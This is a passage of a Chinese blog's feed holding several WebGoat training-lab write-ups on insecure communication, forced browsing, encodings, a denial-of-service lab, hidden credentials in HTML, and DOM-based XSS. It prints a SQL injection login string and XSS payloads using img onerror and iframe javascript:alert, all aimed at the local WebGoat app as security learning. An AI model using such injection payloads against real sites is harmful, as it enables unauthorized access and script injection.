&lt;p&gt;关于burpsuit抓取HTTPS的配置可以见官网：[点击这里][&lt;a href=&quot;https://support.portswigger.net/customer/portal/articles/1783075-installing-burp-s-ca-certificate-in-your-browser]，需要注意的是要把代理设置为burpsuit后，才能访问http://burp网址，并且下载证书。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://support.portswigger.net/customer/portal/articles/1783075-installing-burp-s-ca-certificate-in-your-browser]，需要注意的是要把代理设置为burpsuit后，才能访问http://burp网址，并且下载证书。&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;如何配置tomcat服务器为HTTPS&quot;&gt;&lt;a href=&quot;#如何配置tomcat服务器为HTTPS&quot; class=&quot;headerlink&quot; title=&quot;如何配置tomcat服务器为HTTPS&quot;&gt;&lt;/a&gt;如何配置tomcat服务器为HTTPS&lt;/h3&gt;&lt;p&gt;其实这只是配置服务器的&lt;a href=&quot;http://my.oschina.net/nearzk/blog/485652&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;单向认证&lt;/a&gt;的过程，将tomcat配置为支持HTTPS传输，就需要在HTTP基础上加一层协议进去。详细配置过程见&lt;a href=&quot;http://blog.csdn.net/jimmy609/article/details/18557955&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_insecure_communication/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/webgoat_insecure_communication/3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;这张图片是tomcat里面conf里面server.xml配置文件中关于HTTPS的部分。&lt;/p&gt;
&lt;h2 id=&quot;绝望&quot;&gt;&lt;a href=&quot;#绝望&quot; class=&quot;headerlink&quot; title=&quot;绝望&quot;&gt;&lt;/a&gt;绝望&lt;/h2&gt;&lt;p&gt;搞了两天都没有搞好，我已经绝望了。主要问题及流程是这样的：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先是做到第二步改为HTTPS的请求后，页面不存在，后来发现是tomcat本身没有配置好，于是又找了一大串资料，把证书什么的，都弄好了，然后出现了HTTPS的页面，可以正常显示了。&lt;/li&gt;
&lt;li&gt;然后用burpsiut抓包，提示错误，于是我又给浏览器装burpsuit的证书，终于可以抓SSL的包了。&lt;/li&gt;
&lt;li&gt;抓到发现居然是明文，就把burpsuit和wireshark的原理弄清楚了。&lt;/li&gt;
&lt;li&gt;然后换wireshark抓包，要解决的第一个问题是本地抓包的问题，后来终于解决了，可是对于https抓不到TSLV1.0的协议，只有一堆TCP的包&lt;/li&gt;
&lt;li&gt;然后试着抓HTTPS百度的包，发现有TLSV1.0，那为何tomcat没有呢？又把单机变为双机，把自己的笔记本配置为服务器，把公司电脑当做客户端访问了。&lt;/li&gt;
&lt;li&gt;搞了半天，还是没有发现原因在哪里，遂放弃。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;剩下待的问题&quot;&gt;&lt;a href=&quot;#剩下待的问题&quot; class=&quot;headerlink&quot; title=&quot;剩下待的问题&quot;&gt;&lt;/a&gt;剩下待的问题&lt;/h2&gt;&lt;p&gt;为何wireshark抓已经配置成https的包之后，只有一堆TCP的包，而没有TSLV一类的协议包。求有大神看见的，也帮忙解答一下这究竟是为什么？&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/04/27/Webgoat之Insecure_Communication/&quot;&gt;http://qimingyu.github.io/2016/04/27/Webgoat之Insecure_Communication/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Insecure-Login&quot;&gt;&lt;a href=&quot;#Insecure-Login&quot; class=&quot;headerlink&quot; title=&quot;Insecure Login&quot;&gt;&lt;/a&gt;Insecure Login&lt;/h2&gt;&lt;p&gt;该课程第一步需要抓取HTTP传送时的密码，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_insecure_communication/2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;p&gt;该过程直接用burpsuit抓取即可。&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="通信安全" scheme="http://qimingyu.github.io/tags/%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Insecure Configuration</title>
    <link href="http://qimingyu.github.io/2016/04/27/Webgoat%E4%B9%8BInsecure_Configuration/"/>
    <id>http://qimingyu.github.io/2016/04/27/Webgoat之Insecure_Configuration/</id>
    <published>2016-04-27T01:31:12.000Z</published>
    <updated>2016-04-27T02:07:18.000Z</updated>
    
    <content type="html">&lt;p&gt;这节主要是讲不安全的配置所带来的威胁。&lt;/p&gt;
&lt;h2 id=&quot;Forced-Browsing&quot;&gt;&lt;a href=&quot;#Forced-Browsing&quot; class=&quot;headerlink&quot; title=&quot;Forced Browsing&quot;&gt;&lt;/a&gt;Forced Browsing&lt;/h2&gt;&lt;p&gt;强制浏览是指黑客用来访问获取那些没有被引用，但仍然允许被访问的资源。其中一种方法是操纵浏览器中的URL，删除结尾部分，直到找到一个不受保护的目录。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;如果想访问一个受限制的页面，需要能够猜测URL访问页面，如“/admin”，该课程要求我们猜测找到WebGoat的配置页面。&lt;/p&gt;
&lt;p&gt;最后在URL的地址里面输入：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://localhost:8080/WebGoat/conf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost:8080/WebGoat/conf&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;获得配置页面如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_insecure_configuration/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;这个攻击的关键是要猜测对正确的URL地址以获得对资源的访问，因此需要对站点的一般目录结构比较熟悉。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/04/27/Webgoat之Insecure_Configuration/&quot;&gt;http://qimingyu.github.io/2016/04/27/Webgoat之Insecure_Configuration/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这节主要是讲不安全的配置所带来的威胁。&lt;/p&gt;
&lt;h2 id=&quot;Forced-Browsing&quot;&gt;&lt;a href=&quot;#Forced-Browsing&quot; class=&quot;headerlink&quot; title=&quot;Forced Browsing&quot;&gt;&lt;/a&gt;Forced Browsing&lt;/h2&gt;&lt;p&gt;强制浏览是指黑客用来访问获取那些没有被引用，但仍然允许被访问的资源。其中一种方法是操纵浏览器中的URL，删除结尾部分，直到找到一个不受保护的目录。&lt;/p&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="配置" scheme="http://qimingyu.github.io/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Insecure Storage</title>
    <link href="http://qimingyu.github.io/2016/04/26/Webgoat%E4%B9%8BInsecurity_Storage/"/>
    <id>http://qimingyu.github.io/2016/04/26/Webgoat之Insecurity_Storage/</id>
    <published>2016-04-26T07:40:04.000Z</published>
    <updated>2016-05-20T08:53:57.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Encoding-Basics&quot;&gt;&lt;a href=&quot;#Encoding-Basics&quot; class=&quot;headerlink&quot; title=&quot;Encoding Basics&quot;&gt;&lt;/a&gt;Encoding Basics&lt;/h2&gt;&lt;p&gt;在Web应用程序中会根据不同的应用选择不同的编码方案。每一个编码方案都有与其相关的算法。&lt;br&gt;编码和加密是不一样的。下面讲解几种常用的编码/加密方法。这章是Web安全的编码基础。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;　&lt;/p&gt;
&lt;h3 id=&quot;Base64&quot;&gt;&lt;a href=&quot;#Base64&quot; class=&quot;headerlink&quot; title=&quot;Base64&quot;&gt;&lt;/a&gt;Base64&lt;/h3&gt;&lt;p&gt;Base64是将普通字符编码成二进制数据。&lt;/p&gt;
&lt;h3 id=&quot;Entity&quot;&gt;&lt;a href=&quot;#Entity&quot; class=&quot;headerlink&quot; title=&quot;Entity&quot;&gt;&lt;/a&gt;Entity&lt;/h3&gt;&lt;p&gt;HTML中常用的特殊字符实体编码&lt;/p&gt;
&lt;h3 id=&quot;PBE&quot;&gt;&lt;a href=&quot;#PBE&quot; class=&quot;headerlink&quot; title=&quot;PBE&quot;&gt;&lt;/a&gt;PBE&lt;/h3&gt;&lt;p&gt;PBE算法是一种基于口令的加密算法，其特点是使用口令代替了密钥，而口令由用户自己掌管，采用随机数杂凑多重加密等方法保证数据的安全性。&lt;/p&gt;
&lt;h3 id=&quot;MD5&quot;&gt;&lt;a href=&quot;#MD5&quot; class=&quot;headerlink&quot; title=&quot;MD5&quot;&gt;&lt;/a&gt;MD5&lt;/h3&gt;&lt;p&gt;MD5是一种单向散列的哈希算法&lt;/p&gt;
&lt;h3 id=&quot;SHA-256&quot;&gt;&lt;a href=&quot;#SHA-256&quot; class=&quot;headerlink&quot; title=&quot;SHA-256&quot;&gt;&lt;/a&gt;SHA-256&lt;/h3&gt;&lt;p&gt;也是一种单向散列的哈希算法&lt;/p&gt;
&lt;h3 id=&quot;Unicode-encoding&quot;&gt;&lt;a href=&quot;#Unicode-encoding&quot; class=&quot;headerlink&quot; title=&quot;Unicode encoding&quot;&gt;&lt;/a&gt;Unicode encoding&lt;/h3&gt;&lt;p&gt;Unicode是国际组织制定的可以容纳世界上所有文字和符号的字符编码方案。&lt;/p&gt;
&lt;h3 id=&quot;URL-encoding&quot;&gt;&lt;a href=&quot;#URL-encoding&quot; class=&quot;headerlink&quot; title=&quot;URL encoding&quot;&gt;&lt;/a&gt;URL encoding&lt;/h3&gt;&lt;p&gt;URL编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值 ，将它们以name/value参数编码（移去那些不能传送的字符，将数据排行等等）作为URL的一部分或者分离地发给服务器。&lt;/p&gt;
&lt;h3 id=&quot;Hex-encoding&quot;&gt;&lt;a href=&quot;#Hex-encoding&quot; class=&quot;headerlink&quot; title=&quot;Hex encoding&quot;&gt;&lt;/a&gt;Hex encoding&lt;/h3&gt;&lt;p&gt;16进制编码&lt;/p&gt;
&lt;h3 id=&quot;Rot13&quot;&gt;&lt;a href=&quot;#Rot13&quot; class=&quot;headerlink&quot; title=&quot;Rot13&quot;&gt;&lt;/a&gt;Rot13&lt;/h3&gt;&lt;p&gt;Rot13编码是一种简单的编码，目的是让文本不可读，但它很容易被还原并且不具有安全性&lt;/p&gt;
&lt;h3 id=&quot;Double-URL-encoding&quot;&gt;&lt;a href=&quot;#Double-URL-encoding&quot; class=&quot;headerlink&quot; title=&quot;Double URL encoding&quot;&gt;&lt;/a&gt;Double URL encoding&lt;/h3&gt;&lt;p&gt;当使用地址栏提交查询参数时，如果不编码，非英文字符会按照操作系统的字符集进行编码提交到服务器，服务器会按照配置的字符集进行解码，所以如果两者不一致就会导致乱码。&lt;/p&gt;
&lt;p&gt;encodeURI函数采用UTF-8对URL进行编码，所以如果服务器在进行解码时使用的是其他的编码方式就会出现乱码，默认的服务器配置的解码字符集都不是UTF-8，所以大部分情况下地址栏提交中文查询参数时会产生乱码；针对这种情况，可以连续使用两次encodeURI在客户端(主要指浏览器)对非英文字符进行编码，然后在服务端使用Java.net.URLDecoder(String.”UTF-8”)解码，即可得到正确的中文。&lt;/p&gt;
&lt;h3 id=&quot;Double-unicode-encoding&quot;&gt;&lt;a href=&quot;#Double-unicode-encoding&quot; class=&quot;headerlink&quot; title=&quot;Double unicode encoding&quot;&gt;&lt;/a&gt;Double unicode encoding&lt;/h3&gt;&lt;h3 id=&quot;XOR&quot;&gt;&lt;a href=&quot;#XOR&quot; class=&quot;headerlink&quot; title=&quot;XOR&quot;&gt;&lt;/a&gt;XOR&lt;/h3&gt;&lt;p&gt;异或运算的加密&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;工作了一整天，感觉好疲惫。要学的东西还有好多。书到用时方恨少。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/04/26/Webgoat之Insecurity_Storage/&quot;&gt;http://qimingyu.github.io/2016/04/26/Webgoat之Insecurity_Storage/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Encoding-Basics&quot;&gt;&lt;a href=&quot;#Encoding-Basics&quot; class=&quot;headerlink&quot; title=&quot;Encoding Basics&quot;&gt;&lt;/a&gt;Encoding Basics&lt;/h2&gt;&lt;p&gt;在Web应用程序中会根据不同的应用选择不同的编码方案。每一个编码方案都有与其相关的算法。&lt;br&gt;编码和加密是不一样的。下面讲解几种常用的编码/加密方法。这章是Web安全的编码基础。&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="不安全存储" scheme="http://qimingyu.github.io/tags/%E4%B8%8D%E5%AE%89%E5%85%A8%E5%AD%98%E5%82%A8/"/>
    
      <category term="网络编码" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat之DOS</title>
    <link href="http://qimingyu.github.io/2016/04/26/Webgoat%E4%B9%8BDOS/"/>
    <id>http://qimingyu.github.io/2016/04/26/Webgoat之DOS/</id>
    <published>2016-04-26T06:57:45.000Z</published>
    <updated>2016-04-26T07:39:30.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Denial-of-Service&quot;&gt;&lt;a href=&quot;#Denial-of-Service&quot; class=&quot;headerlink&quot; title=&quot;Denial of Service&quot;&gt;&lt;/a&gt;Denial of Service&lt;/h2&gt;&lt;p&gt;该课程讲的是由多个登陆引起的拒绝服务。数据库连接总是要占用移动资源的，过度使用会影响系统性能。我们的目标网站允许多次登陆，但它有一个数据库的连接池，只能最大允许两个连接存在，因此我们必须要获得多个用户名和密码，分别登陆，使其超过允许的最大连接数，造成拒绝服务。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先用sql注入登陆，输入如下内容：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;User Name：qimingyu&lt;br&gt;Password：’ or ‘1’ = ‘1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;登陆成功之后显示如下页面：&lt;br&gt;&lt;img src=&quot;/images/webgoat_Dos/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以看出这条SQL语句，很好的说明了我们注入登陆的原理。&lt;/p&gt;
&lt;p&gt;之后输入三个人的账号和密码就行了。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;拒绝服务攻击可以通过各种方式达到，这仅仅只是其中一种。关于绕过登陆名和密码的验证，后面再做一个总结。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/04/26/Webgoat之DOS/&quot;&gt;http://qimingyu.github.io/2016/04/26/Webgoat之DOS/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Denial-of-Service&quot;&gt;&lt;a href=&quot;#Denial-of-Service&quot; class=&quot;headerlink&quot; title=&quot;Denial of Service&quot;&gt;&lt;/a&gt;Denial of Service&lt;/h2&gt;&lt;p&gt;该课程讲的是由多个登陆引起的拒绝服务。数据库连接总是要占用移动资源的，过度使用会影响系统性能。我们的目标网站允许多次登陆，但它有一个数据库的连接池，只能最大允许两个连接存在，因此我们必须要获得多个用户名和密码，分别登陆，使其超过允许的最大连接数，造成拒绝服务。&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="DOS" scheme="http://qimingyu.github.io/tags/DOS/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat之Code Quality</title>
    <link href="http://qimingyu.github.io/2016/04/26/Webgoat%E4%B9%8BCode_Quality/"/>
    <id>http://qimingyu.github.io/2016/04/26/Webgoat之Code_Quality/</id>
    <published>2016-04-26T06:05:10.000Z</published>
    <updated>2016-04-26T06:58:25.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Discover-Clues-in-the-HTML&quot;&gt;&lt;a href=&quot;#Discover-Clues-in-the-HTML&quot; class=&quot;headerlink&quot; title=&quot;Discover Clues in the HTML&quot;&gt;&lt;/a&gt;Discover Clues in the HTML&lt;/h2&gt;&lt;p&gt;在HTML中找线索。众所周知，很多开发者喜欢在源代码中保存fixme（指代码原作者没有完成，需要你去完成的意思）、注释、调试代码等语句或信息。而我们通过审查源码中的相关信息往往能找到密码、后门及一些潜在的问题。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;该课程需要我们输入用户名和密码通过登录验证，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_code_quality/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;最终在源代码的这个地方发现了蛛丝马迹：&lt;br&gt;&lt;img src=&quot;/images/webgoat_code_quality/2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;p&gt;输入用户名：admin&lt;br&gt;输入密码：adminpw&lt;/p&gt;
&lt;p&gt;最后通过验证。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;在发布版本之前，一定要好好审查源代码，不该有的信息都不能有。这是代码习惯和质量的问题，做事情一定要精益求精，把事情做到极致。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/04/26/Webgoat之Code_Quality/&quot;&gt;http://qimingyu.github.io/2016/04/26/Webgoat之Code_Quality/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Discover-Clues-in-the-HTML&quot;&gt;&lt;a href=&quot;#Discover-Clues-in-the-HTML&quot; class=&quot;headerlink&quot; title=&quot;Discover Clues in the HTML&quot;&gt;&lt;/a&gt;Discover Clues in the HTML&lt;/h2&gt;&lt;p&gt;在HTML中找线索。众所周知，很多开发者喜欢在源代码中保存fixme（指代码原作者没有完成，需要你去完成的意思）、注释、调试代码等语句或信息。而我们通过审查源码中的相关信息往往能找到密码、后门及一些潜在的问题。&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="代码质量" scheme="http://qimingyu.github.io/tags/%E4%BB%A3%E7%A0%81%E8%B4%A8%E9%87%8F/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat之AJAX Security</title>
    <link href="http://qimingyu.github.io/2016/04/26/Webgoat%E4%B9%8BAJAX_Security/"/>
    <id>http://qimingyu.github.io/2016/04/26/Webgoat之AJAX_Security/</id>
    <published>2016-04-26T00:55:07.000Z</published>
    <updated>2016-05-03T11:15:23.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;DOM-Based-cross-site-scripting&quot;&gt;&lt;a href=&quot;#DOM-Based-cross-site-scripting&quot; class=&quot;headerlink&quot; title=&quot;DOM-Based cross-site scripting&quot;&gt;&lt;/a&gt;DOM-Based cross-site scripting&lt;/h2&gt;&lt;p&gt;基于DOM的跨站点脚本。DOM是文档对象模型，它是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式。W3C DOM标准被分为3个不同的部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;核心DOM-针对任何结构化文档的标准模型&lt;/li&gt;
&lt;li&gt;XML DOM-针对XML文档的标准模型&lt;/li&gt;
&lt;li&gt;HTML DOM-针对HTML文档的标准模型（HTML DOM是关于如何获取、修改、添加或HTML元素的标准）&lt;/li&gt;
&lt;/ul&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;由于它允许动态修改网页内容，这样就可以被攻击者用来进行恶意代码注入。而这种恶意代码注入一般是未经验证的用户的输入直接修改了客户端的页面。HTML DOM实体中可随时插入新的HTML语句或JavaScript语句，因此很容易被恶意代码利用，从而来改变页面显示内容或执行恶意代码。HTML标记语言中很多标签的特殊属性参数中允许插入JS代码，如：IMG/IFRAME等。&lt;br&gt;如下图所示:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;发现当你在输入框输入什么时，页面上方就会显示出什么。&lt;/p&gt;
&lt;h3 id=&quot;Stage-1&quot;&gt;&lt;a href=&quot;#Stage-1&quot; class=&quot;headerlink&quot; title=&quot;Stage 1&quot;&gt;&lt;/a&gt;Stage 1&lt;/h3&gt;&lt;p&gt;因此这部分课程要求我们构造恶意代码输入，使用图片OWASP IMAGE（localhost:8080/WebGoat/images/logos/owasp.jpg)来改变原来Web页面的显示方式。&lt;/p&gt;
&lt;p&gt;在输入框中输入如下内容：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;IMG SRC=&lt;span class=&quot;string&quot;&gt;&quot;images/logos/owasp.jpg&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;就会显示其图片：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是一个反射型的XSS。&lt;br&gt;关于反射型XSS和存储型XSS，插播以下内容：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;相同点：两者的本质问题都是让对方浏览器执行你插入的js代码。&lt;br&gt;不同点：存储型的XSS代码放在了服务器中，具有持久性；反射型的XSS需要用户点击交互才能执行，非持久化。前者是枪直接打就行了，后者是地雷，需要别人踩才能触发。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Stage-2&quot;&gt;&lt;a href=&quot;#Stage-2&quot; class=&quot;headerlink&quot; title=&quot;Stage 2&quot;&gt;&lt;/a&gt;Stage 2&lt;/h3&gt;&lt;p&gt;这部分是要用image标签创建一个JavaScript Alert对话框出来。&lt;br&gt;输入如下内容，然后提交&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;img src=x onerror=;;alert(&lt;span class=&quot;string&quot;&gt;&#39;xss&#39;&lt;/span&gt;)/&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;得到网页弹出其对话框&lt;/p&gt;
&lt;h3 id=&quot;Stage-3&quot;&gt;&lt;a href=&quot;#Stage-3&quot; class=&quot;headerlink&quot; title=&quot;Stage 3&quot;&gt;&lt;/a&gt;Stage 3&lt;/h3&gt;&lt;p&gt;这部分要求用iframe标签创建JavaScript Alert对话框。&lt;br&gt;输入如下内容，然后提交&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;iframe src=&lt;span class=&quot;string&quot;&gt;&quot;javascript:alert(&#39;xss&#39;);&quot;&lt;/span&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;得到网页的输入框&lt;/p&gt;
